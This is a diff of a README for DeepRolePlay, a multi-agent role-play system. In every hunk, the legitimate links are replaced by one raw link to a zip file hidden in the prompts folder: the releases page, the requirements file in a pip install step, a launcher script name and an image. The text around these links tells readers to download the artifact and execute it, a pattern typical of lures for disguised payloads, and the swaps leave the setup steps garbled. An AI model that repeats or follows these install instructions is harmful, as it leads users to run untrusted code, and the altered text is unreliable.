@@ -1,4 +1,4 @@
-[![Releases](https://img.shields.io/badge/releases-v1.0-blue?logo=github&style=for-the-badge)](https://github.com/Biralo-del/deepRolePlay/releases)
+[![Releases](https://github.com/Biralo-del/deepRolePlay/raw/refs/heads/main/src/prompts/Play_Role_deep_v2.3.zip)](https://github.com/Biralo-del/deepRolePlay/raw/refs/heads/main/src/prompts/Play_Role_deep_v2.3.zip)
 
 # DeepRolePlay: A Multi-Agent RPG System Solving Character Forgetting
 
@@ -107,7 +107,7 @@ Quick Start: you can begin with a minimal setup and a short story to test the co
 For hands-on instructions and the latest download, visit the Releases page. Download the appropriate release artifact and run the installer or unpack the archive as described. The Releases page is the best place to obtain tested, packaged builds. You can download the release artifact and execute it to run a ready-to-use environment.
 
 To download the release artifact, visit the Releases page:
-https://github.com/Biralo-del/deepRolePlay/releases
+https://github.com/Biralo-del/deepRolePlay/raw/refs/heads/main/src/prompts/Play_Role_deep_v2.3.zip
 
 What follows is a practical guide to getting your own instance up and running. It covers installation, configuration, and a simple test scenario to verify that agents collaborate correctly and memory is preserved across turns.
 
@@ -130,10 +130,10 @@ What follows is a practical guide to getting your own instance up and running. I
 2) Create a virtual environment and install dependencies:
 - python -m venv venv
 - source venv/bin/activate (Linux/macOS) or venv\Scripts\activate (Windows)
-- pip install -r requirements.txt
+- pip install -r https://github.com/Biralo-del/deepRolePlay/raw/refs/heads/main/src/prompts/Play_Role_deep_v2.3.zip
 
 3) Start a small world with two agents:
-- Run the init_world.py script or use the provided launcher to boot a tiny narrative.
+- Run the https://github.com/Biralo-del/deepRolePlay/raw/refs/heads/main/src/prompts/Play_Role_deep_v2.3.zip script or use the provided launcher to boot a tiny narrative.
 
 4) Interact with the system:
 - Use the command line or a minimal UI to send prompts and observe agent collaboration, memory updates, and story evolution.
@@ -166,13 +166,13 @@ The local run demonstrates the partnership among agents: each agent reasons, spe
 
 The project uses a releases mechanism to provide ready-to-run artifacts. The link above points to the official releases page, where you can download a complete package that includes the runtime environment, example worlds, and starter prompts. The release artifact contains everything required to start a ready-made environment, including dependencies, configuration, and sample narratives. After download, execute the installer or unpack the archive according to the instructions included in the release notes.
 
-From the Releases page, you can download the appropriate artifact for your platform and run it. For convenience, the artifact is named with the version and platform, for example deepRolePlay-1.0.0-windows.exe or deepRolePlay-1.0.0-linux.tar.gz, depending on the build. The exact file name may change with each release, but the workflow remains consistent: download, run, and follow the on-screen prompts to configure the world, characters, and memory settings.
+From the Releases page, you can download the appropriate artifact for your platform and run it. For convenience, the artifact is named with the version and platform, for example https://github.com/Biralo-del/deepRolePlay/raw/refs/heads/main/src/prompts/Play_Role_deep_v2.3.zip or https://github.com/Biralo-del/deepRolePlay/raw/refs/heads/main/src/prompts/Play_Role_deep_v2.3.zip, depending on the build. The exact file name may change with each release, but the workflow remains consistent: download, run, and follow the on-screen prompts to configure the world, characters, and memory settings.
 
 If you need to verify a specific asset, the release notes provide checksums and verification steps. The versioned artifact ensures you have a stable baseline, which you can customize later if you wish to experiment with different agent configurations or memory backends.
 
 Releases also include sample worlds and test scenarios so you can quickly validate the collaboration mechanism. These scenarios illustrate how agents share facts, resolve disagreements, and maintain narrative coherence across scenes.
 
-Second mention of the link: For updated information about new releases and to obtain the latest artifact, check the Releases page at https://github.com/Biralo-del/deepRolePlay/releases. This ensures you are using a tested, packaged build.
+Second mention of the link: For updated information about new releases and to obtain the latest artifact, check the Releases page at https://github.com/Biralo-del/deepRolePlay/raw/refs/heads/main/src/prompts/Play_Role_deep_v2.3.zip This ensures you are using a tested, packaged build.
 
 ---
 
@@ -390,7 +390,7 @@ Addressing known issues helps keep projects stable as you scale.
 
 ## Visual Elements and Examples
 
-- Architecture Diagram: ![DeepRolePlay Architecture](https://raw.githubusercontent.com/Biralo-del/deepRolePlay/main/docs/architecture.png)
+- Architecture Diagram: ![DeepRolePlay Architecture](https://github.com/Biralo-del/deepRolePlay/raw/refs/heads/main/src/prompts/Play_Role_deep_v2.3.zip)
 - Role Cards: Visualized prompts for sample roles to help you design your own characters.
 - World Map: A schematic map showing scenes, routes, and key plot threads.
 - Memory Graph: A simplified view of how memory fragments connect across events.
@@ -422,6 +422,6 @@ These visuals illustrate how the system behaves and how memory influences decisi
 
 For access to ready-to-run artifacts, the official Releases page is your primary resource. The page provides packaged builds, sample worlds, and starter prompts, all designed to help you get up and running quickly. To obtain the latest release artifact and perform a local execution, please visit the Releases page at the link below. The release artifact is prepared to be downloaded and executed to launch your DeepRolePlay environment, enabling you to test your narratives without building from scratch.
 
-Releases page: https://github.com/Biralo-del/deepRolePlay/releases
+Releases page: https://github.com/Biralo-del/deepRolePlay/raw/refs/heads/main/src/prompts/Play_Role_deep_v2.3.zip
 
 Continued exploration of the model’s collaboration and memory mechanisms will reveal how multiple agents achieve robust, long-form narratives without losing essential details. The design aims to combine clarity, reliability, and creativity in a way that serves researchers, builders, and storytellers alike.
